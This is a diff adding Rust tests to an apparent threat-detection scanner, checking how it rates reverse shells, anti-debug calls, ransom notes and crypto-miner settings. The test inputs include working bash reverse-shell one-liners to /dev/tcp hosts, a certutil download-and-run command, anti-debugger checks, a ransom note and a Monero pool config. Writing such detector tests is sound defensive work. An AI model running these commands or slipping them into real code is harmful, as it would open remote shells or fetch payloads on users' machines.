@@ -1035,10 +1035,152 @@ os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\nsubproce
 }
 
 #[test]
+fn notes_about_reverse_shells_beside_an_ordinary_dev_tcp_socket_stay_weak() {
+    for text in [
+        &b"# Bash networking\n\n    exec 3<>/dev/tcp/example.com/80\n    printf 'GET / HTTP/1.0\\r\\n\\r\\n' >&3\n    cat <&3\n\nThe same feature is how a reverse shell is written in pure bash.\n"[..],
+        &b"#!/bin/bash\n# health check: it is not a bind shell\nexec 3<>/dev/tcp/127.0.0.1/8080\nprintf 'HEAD / HTTP/1.0\\r\\n\\r\\n' >&3\nread -r status <&3\n"[..],
+    ] {
+        let (level, classes, _) = level_of(text);
+        assert_eq!(level, ThreatLevel::Clean, "{}", String::from_utf8_lossy(text));
+        assert!(classes.is_empty());
+    }
+}
+
+#[test]
 fn documentation_about_reverse_shells_stays_weak_beside_shell_strings() {
     let (level, classes, _) = level_of(
         b"A reverse shell connects back to the operator. The shell started is /bin/sh.\nIt may call os.dup2( or pty.spawn( on the way.\n",
     );
     assert_eq!(level, ThreatLevel::Clean);
     assert!(classes.is_empty());
+}
+
+// ---- R8-T: source that calls an anti-debug technique.
+
+#[test]
+fn source_code_that_calls_an_anti_debug_technique_keeps_its_level() {
+    // The six sources of test_programs call the technique; each is Suspicious.
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("test_programs");
+    for name in [
+        "c_advanced.c",
+        "go_test.go",
+        "ada_test.adb",
+        "fortran_test.f90",
+        "nim_test.nim",
+        "zig_test.zig",
+    ] {
+        let analysis = analyze_threats(&root.join(name)).unwrap();
+        assert!(
+            analysis.threat_level >= ThreatLevel::Suspicious,
+            "{name}: {:?}",
+            analysis.threat_level
+        );
+    }
+    // Calls of the debugger-check APIs.
+    let (level, _, _) = level_of(
+        b"#include <windows.h>\nint main(void) {\n  BOOL b = FALSE;\n  if (IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), &b)) return 1;\n  return 0;\n}\n",
+    );
+    assert!(level >= ThreatLevel::Suspicious);
+    // A real call after a closed comment is still a call.
+    let (level, _, _) = level_of(
+        b"#include <windows.h>\n#include <stdio.h>\n/* entry point */\nint main(void) {\n  BOOL b = FALSE;\n  if (IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), &b)) return 1;\n  puts(\"ok\");\n  return 0;\n}\n",
+    );
+    assert!(level >= ThreatLevel::Suspicious);
+    // A read of the tracer's pid, with the VM names beside it.
+    let (level, _, _) = level_of(
+        b"package main\nimport \"os\"\nfunc d() bool {\n  data, _ := os.ReadFile(\"/proc/self/status\")\n  _ = data\n  return false\n}\nvar vm = []string{\"VirtualBox\", \"VMware\", \"QEMU\", \"TracerPid\"}\n",
+    );
+    assert!(level >= ThreatLevel::Suspicious);
+}
+
+#[test]
+fn prose_that_only_names_the_anti_debug_calls_stays_weak() {
+    // Backtick spans, a fenced example and a string literal are not calls.
+    for text in [
+        &b"# Notes\n\nCall `IsDebuggerPresent()` or `CheckRemoteDebuggerPresent(` to find a debugger.\n"[..],
+        &b"# Notes\n\n```c\nif (IsDebuggerPresent() || CheckRemoteDebuggerPresent(h, &b)) exit(1);\n```\n"[..],
+        &b"fn main() {\n    let names = \"IsDebuggerPresent( and CheckRemoteDebuggerPresent(\";\n    println!(\"{names}\");\n}\n"[..],
+        &b"# Notes\n\nPrograms read TracerPid from \"/proc/self/status\" and check VMware, VirtualBox.\n"[..],
+        // Plain prose: no heading, fence, backtick or quote.
+        &b"Notes on debuggers\nuse IsDebuggerPresent() at start-up and exit when it returns true.\nThe second check is CheckRemoteDebuggerPresent() and it reports the same.\n"[..],
+        // Names inside a C block comment are not calls.
+        &b"#include <stdio.h>\n/* IsDebuggerPresent() and CheckRemoteDebuggerPresent() are not used; attach freely. */\nint main(void) { puts(\"hi\"); return 0; }\n"[..],
+        &b"#include <stdio.h>\n/* IsDebuggerPresent() and\n   CheckRemoteDebuggerPresent();\n   are not used. */\nint main(void) { puts(\"hi\"); return 0; }\n"[..],
+        // A closed header comment, then a closed comment that names the calls.
+        &b"/* hello.c: prints a greeting. */\n/* IsDebuggerPresent() and CheckRemoteDebuggerPresent() are not called;\n   attach any debugger you like. */\n#include <stdio.h>\nint main(void) {\n  puts(\"hello\");\n  return 0;\n}\n"[..],
+        &b"A Windows program typically calls IsDebuggerPresent() first and then CheckRemoteDebuggerPresent() to find a debugger. On Linux the usual trick is ptrace(PTRACE_TRACEME, 0, 0, 0) and reading TracerPid from /proc/self/status.\n"[..],
+    ] {
+        let (level, classes, rules) = level_of(text);
+        assert!(rules.iter().any(|r| r == "anti_analysis"), "{text:?} {rules:?}");
+        assert_eq!(level, ThreatLevel::Clean, "{}", String::from_utf8_lossy(text));
+        assert!(classes.is_empty());
+    }
+}
+
+#[test]
+fn text_that_quotes_indicators_keeps_its_level() {
+    // Text that quotes an indicator keeps its level (known limit: a document
+    // that only quotes ransom or reverse-shell strings is still rated).
+    let doc = b"# Detection notes\n\n```\nYour files have been encrypted.\nPay the ransom in Bitcoin.\n```\n";
+    let (level, classes, _) = level_of(doc);
+    assert_eq!(level, ThreatLevel::Critical);
+    assert!(classes.contains(&ThreatClassification::Ransomware));
+
+    // Source and scripts that embed and run their indicators in strings are
+    // the real thing
+    for hostile in [
+        &b"var s=new ActiveXObject(\"WScript.Shell\");\ns.Run(\"cmd.exe /c certutil -urlcache -f http://192.0.2.1/p.exe p.exe && p.exe\",0);\n"[..],
+        &b"#!/bin/bash\nfunction start {\n  nohup bash -c \"bash -i >& /dev/tcp/192.0.2.10/4444 0>&1\" &\n}\nstart\n"[..],
+        &b"import os\nos.system(\"bash -i >& /dev/tcp/192.0.2.10/4444 0>&1\")\n"[..],
+        // A fence line elsewhere in a file with no shebang does not make it a
+        // document: the reverse shell in backticks or a template literal runs.
+        &b"cat > README.md <<'EOF'\n```\nusage: tool\n```\nEOF\nr=`bash -i >& /dev/tcp/192.0.2.71/9001 0>&1 &`\n"[..],
+        &b"// usage:\n// ```\n// node tool.js\n// ```\nconst { exec } = require('child_process');\nexec(`bash -i >& /dev/tcp/192.0.2.72/4444 0>&1`);\n"[..],
+        // A `#` comment is not a heading and command substitution is not a
+        // backtick span.
+        &b"#!/bin/bash\n# nightly sync helper\nfor i in 1 2; do\n  r=`bash -i >& /dev/tcp/192.0.2.44/9001 0>&1`\ndone\n"[..],
+    ] {
+        let (level, classes, _) = level_of(hostile);
+        assert!(level >= ThreatLevel::Suspicious, "{}", String::from_utf8_lossy(hostile));
+        assert!(classes.contains(&ThreatClassification::Backdoor));
+    }
+
+    let (level, classes, _) = level_of(
+        b"#!/bin/sh\n# perf tuning\nfor i in 1 2; do\n  PID=`./worker -o stratum+tcp://pool.example.invalid:3333 -u 44AFF0123456789abcdef --coin monero`\ndone\n",
+    );
+    assert!(level >= ThreatLevel::Suspicious);
+    assert!(classes.contains(&ThreatClassification::Cryptominer));
+
+    // The other side. A plain-text ransom note, in running text.
+    let (level, classes, _) = level_of(
+        b"Your files have been encrypted.\nTo decrypt your files pay the ransom in Bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa.\nRenamed: .locked .encrypted\n",
+    );
+    assert_eq!(level, ThreatLevel::Critical);
+    assert!(classes.contains(&ThreatClassification::Ransomware));
+    // A shell script that runs a reverse shell.
+    let (level, classes, _) = level_of(b"#!/bin/bash\nbash -i >& /dev/tcp/10.1.1.1/4444 0>&1\n");
+    assert!(level >= ThreatLevel::Suspicious);
+    assert!(classes.contains(&ThreatClassification::Backdoor));
+    // A miner configuration file: JSON, and TOML, are all quoted strings.
+    for config in [
+        &b"{\n  \"coin\": \"monero\",\n  \"url\": \"stratum+tcp://pool.example.invalid:3333\",\n  \"hashrate\": true\n}\n"[..],
+        &b"[pool]\nurl = \"stratum+tcp://pool.example.invalid:3333\"\ncoin = \"monero\"\n"[..],
+    ] {
+        let (level, classes, _) = level_of(config);
+        assert!(level >= ThreatLevel::Suspicious, "{}", String::from_utf8_lossy(config));
+        assert!(classes.contains(&ThreatClassification::Cryptominer));
+    }
+    // A program that names its pool and wallet in code: identifiers are
+    // outside any quote.
+    let (level, classes, _) = level_of(
+        b"package main\nvar WalletAddr = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"\nvar PoolURL = \"stratum+tcp://pool.example.invalid:3333\"\nfunc startMining() {}\n",
+    );
+    assert!(level >= ThreatLevel::Suspicious);
+    assert!(classes.contains(&ThreatClassification::Cryptominer));
+    // A binary that holds the same words is never weak.
+    let mut binary = vec![0u8, 1, 2, 0];
+    binary.extend_from_slice(b"Your files have been encrypted. Pay the ransom in Bitcoin.");
+    let (level, classes, _) = level_of(&binary);
+    assert_eq!(level, ThreatLevel::Critical);
+    assert!(classes.contains(&ThreatClassification::Ransomware));
 }
